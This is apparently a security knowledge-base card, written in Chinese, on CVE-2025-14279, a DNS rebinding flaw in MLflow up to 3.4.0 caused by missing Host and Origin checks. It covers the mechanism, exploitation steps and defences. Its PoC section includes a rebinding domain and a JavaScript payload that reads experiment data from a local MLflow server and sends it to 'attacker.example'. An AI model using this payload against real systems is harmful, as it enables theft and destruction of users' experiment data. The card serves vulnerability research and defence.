---
id: web-generic-cors-mlflow-dns-rebinding-missing-host-validation
title: MLflow ≤ 3.4.0 DNS Rebinding：REST Server 缺 Host/Origin 校验，恶意网页同源调用本地 API 读写实验数据（CVE-2025-14279）
type: scenario
domain: web
path: web/generic/cors
technique: mlflow-dns-rebinding-missing-host-origin-validation
tags:
- dns-rebinding
- mlflow
- host-header
- origin
- cors
- same-origin-policy
- rest-api
- ai-platform
- cve-2025-14279
cve:
- CVE-2025-14279
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: ≤ 3.4.0
verification:
  verified_by: verifier-V177
  verified_at: '2026-11-06T11:46:29+08:00'
  notes: 已对照原文与 8 张图核对：图01 修复 commit b0ffd28 在 fastapi_app.py 初始化安全中间件、图02 pip install mlflow==3.4.0、图03 uvicorn 127.0.0.1:5000、图04 MLflow 3.4.0 Experiments UI、图05 nslookup 72727272.7f000001.rbndr.us 解析 127.0.0.1、图06 rbndr.us 生成域名、图07 Burp GET /api/2.0/mlflow/experiments/search?max_results=1（Host 为 rbndr.us:5000）返回 200 及实验 JSON、图08 AGENTS.md allowed-hosts/CORS 配置，均与卡片一致；≤3.4.0 受影响、3.5.0 修复与原文一致。路径 web/generic/cors 合法，3 个关联 wikilink 目标均存在。未验证点：原文以 Burp 验证服务端接受任意 Host 且重绑定域名可达本地服务，未展示完整浏览器 JS 同源外带页面；浏览器 DNS pinning/PNA 对成功率的影响未实测，卡已标 confidence medium；PoC 未本机复跑。
url: /docs/web/generic/cors/web-generic-cors-mlflow-dns-rebinding-missing-host-validation/
draft: false
kb_aliases:
- CVE-2025-14279
- MLflow DNS Rebinding
- MLflow Host 头校验缺失
- MLflow Origin 校验缺失
- MLflow 本地 REST API 未授权访问
- MLflow 实验数据篡改
---

## 一句话结论

MLflow `≤ 3.4.0` 的 REST Server（FastAPI）没有 Host 头白名单、Origin 校验和 CORS 限制；攻击者用短 TTL 域名做 DNS Rebinding，让受害者浏览器在“同源”假象下向 `127.0.0.1:5000` 的内网 MLflow 发起请求并读取响应，从而未授权查询、修改或删除实验数据；3.5.0 增加安全中间件修复。

## 原理

- **浏览器同源策略边界**：普通恶意网页 `fetch("http://127.0.0.1:5000/...")` 属于跨源请求，浏览器会阻止页面读取响应（且可能触发 Private Network Access 预检）。DNS Rebinding 的目标就是让浏览器误以为目标仍是攻击者自己的源。
- **DNS Rebinding 流程**：攻击者控制域名与 DNS，先让域名解析到攻击者服务器 IP，受害者浏览器加载页面；随后 DNS 记录（短 TTL）改为 `127.0.0.1` 或内网地址；页面继续用同一域名与端口发请求，浏览器按同源处理，不触发跨源限制，但数据包实际到达本机/内网 MLflow。
- **服务端缺少校验**：MLflow `≤ 3.4.0` 的 FastAPI 应用直接暴露 REST API，没有任何安全中间件——不验证 `Host` 头是否属于合法主机名、不检查 `Origin` 是否在允许列表、也不限制跨域来源。Rebinding 后的请求携带的 `Host` 仍是攻击者域名（如 `evil.example:5000`），但服务端照常处理。
- **危害落点**：MLflow 默认无认证，实验、运行、模型、参数与指标都通过 `/api/2.0/mlflow/*` 暴露。攻击者页面因此可以调用 `experiments/search` 读取实验元数据、创建/更新实验与运行、删除实验或运行记录，造成数据泄露、篡改或破坏；请求使用受害者浏览器的网络位置，因此能访问仅绑定在 `127.0.0.1`/内网接口上的 MLflow。
- **为什么修复有效**：3.5.0 的 `HostValidationMiddleware` 在请求进入应用前校验 `Host` 是否匹配 `--allowed-hosts`（默认 localhost 与私有 IP），Rebinding 请求的恶意 Host 直接被 400 拒绝；`CORSBlockingMiddleware` 对 POST/PUT/DELETE/PATCH 校验 `Origin`，`CORSMiddleware` 只放行配置的来源；`SecurityHeadersMiddleware` 额外加 `X-Frame-Options: SAMEORIGIN` 等响应头。
- **前提与局限**：攻击依赖受害者浏览器可解析攻击者域名、浏览器未做 DNS pinning、目标端口可从浏览器网络访问；不同浏览器对 DNS 缓存、PNA 与私有网络请求的策略会影响成功率，因此需要按目标环境实测。

## 触发条件

- MLflow 版本 `≤ 3.4.0`，REST Server 可被受害者浏览器访问（通常监听 `127.0.0.1`、`0.0.0.0` 或内网地址）。
- 服务前没有强制校验 Host 的反向代理/网关，安全中间件未启用（该版本本身也没有）。
- 攻击者控制域名与 DNS，能设置很短 TTL 并在两个 IP 间切换（自建 DNS 或使用 rbndr.us 一类服务）。
- 受害者使用浏览器访问攻击者页面，且浏览器未固定该域名的解析结果。
- MLflow API 未要求认证，或受害者浏览器上下文本身具备可用的访问权限。
- 目标端口与攻击者页面端口一致（同源要求 host:port 完全一致），或通过同端口提供服务。

## 利用步骤

1. 准备恶意页面，并让它与目标 MLflow 使用相同的域名和端口对外提供（例如攻击者服务器在 `:5000` 上返回页面）。首次解析时域名指向攻击者 IP。
2. 受害者打开页面后，页面脚本等待 DNS TTL 过期；攻击者把域名 A 记录改为 `127.0.0.1`（或目标内网 IP）。
3. 脚本用相对 URL/同源 URL 请求 MLflow API，例如 `GET /api/2.0/mlflow/experiments/search?max_results=100`；浏览器认为仍在访问攻击者源，不拦截响应。
4. 读取返回的 JSON（实验、运行、参数、指标等），通过图片请求、`fetch` 到攻击者域名或 WebSocket 外带。
5. 需要篡改时，继续以同源方式发送 `POST /api/2.0/mlflow/experiments/create`、`POST /api/2.0/mlflow/runs/delete`、`POST /api/2.0/mlflow/experiments/delete` 等状态变更请求（具体端点按目标版本 API 为准）。
6. 验证 Rebinding 是否生效：`nslookup <rebinding-domain>` 观察解析从攻击者 IP 切换为 `127.0.0.1`；用 Burp 直接向 `http://<rebinding-domain>:5000/api/2.0/mlflow/experiments/search?max_results=1` 发请求可确认服务端接受该 Host 并返回数据。

## PoC

DNS Rebinding 域名示例（rbndr.us 格式为 `<IP1_HEX>.<IP2_HEX>.rbndr.us`）：

```text
72727272.7f000001.rbndr.us
# 72727272 = 114.114.114.114（攻击者/公网侧）
# 7f000001 = 127.0.0.1（受害者本机 MLflow）
```

恶意页面最小逻辑（需由该域名在 5000 端口提供）：

```html
<script>
const base = location.origin; // rebinding 后实际指向 http://<domain>:5000
setTimeout(async () => {
  const r = await fetch(base + '/api/2.0/mlflow/experiments/search?max_results=100');
  const data = await r.json();
  // 外带：实际攻击可改用图片/beacon 或攻击者域名接收
  new Image().src = 'https://attacker.example/collect?d=' + encodeURIComponent(JSON.stringify(data));
}, 60000); // 等待 DNS TTL 过期并完成重绑定
</script>
```

说明：原文用 Burp 向 `http://72727272.7f000001.rbndr.us:5000/api/2.0/mlflow/experiments/search?max_results=1` 发 GET，返回 200 与实验 JSON，并展示 `nslookup` 解析到 `127.0.0.1`；这验证了服务端接受任意 Host 且 rebinding 域名可达本地服务，但原文未展示完整浏览器 JS 外带页面。本卡片未在本机复跑，rbndr.us 等公共服务可能失效，实际测试建议自建 DNS。

## 变体与关联

- 变体：目标换成其他缺少 Host/Origin 校验的本地服务（Ollama、Jupyter、本地管理面板、MCP 授权服务器等），Rebinding 手法一致。
- 变体：自建 DNS 使用多个 A 记录、极短 TTL 或 0 TTL；部分浏览器/解析器有 DNS pinning，可改用同一域名多 IP 轮换或 IPv6 地址尝试。
- 变体：读取之外，直接对 MLflow 的实验/运行删除、模型注册表写入接口发起状态变更，造成数据破坏或供应链污染。
- 关联：[[web-generic-cors-ollama-desktop-origin-wildcard-csrf]]（浏览器作为跳板访问本地 AI 服务）、[[ai-security-mcp-security-oauth-authz-server-missing-host-check-rebinding]]（同缺 Host 校验的 DNS Rebinding）、[[web-generic-host-header-validation-bypass-ambiguity]]（Host 校验本身的绕过面）。
- 边界：反向代理强制 Host 白名单、启用认证、浏览器阻止私有网络请求或 DNS 固定时，攻击不成立。

## 检测与防御

- 升级 MLflow 到 `3.5.0` 或更高；确认 `fastapi_security.py` 的 `HostValidationMiddleware`、`CORSBlockingMiddleware` 已挂载，勿随意设置 `--disable-security-middleware`。
- 显式配置 `--allowed-hosts`（`MLFLOW_SERVER_ALLOWED_HOSTS`）与 `--cors-allowed-origins`（`MLFLOW_SERVER_CORS_ALLOWED_ORIGINS`），不要使用 `*`；生产环境通过反向代理再校验 Host。
- MLflow 只监听 `127.0.0.1` 或受信内网，并加认证/访问控制；不要把无认证的 tracking server 暴露给普通用户终端可访问的网段。
- 检测：审计 Host 头不在白名单的请求、带外部 `Origin`/`Referer` 的状态变更请求、短 TTL 且解析到内网 IP 的域名查询；监控异常的实验/运行删除与批量查询；浏览器侧可关注页面向私网地址发起的同源请求。
- 响应：若已暴露，检查 MLflow 审计日志与实验数据完整性，恢复被删除/篡改的实验与模型，轮换相关凭据，升级并收紧 Host/CORS 配置。
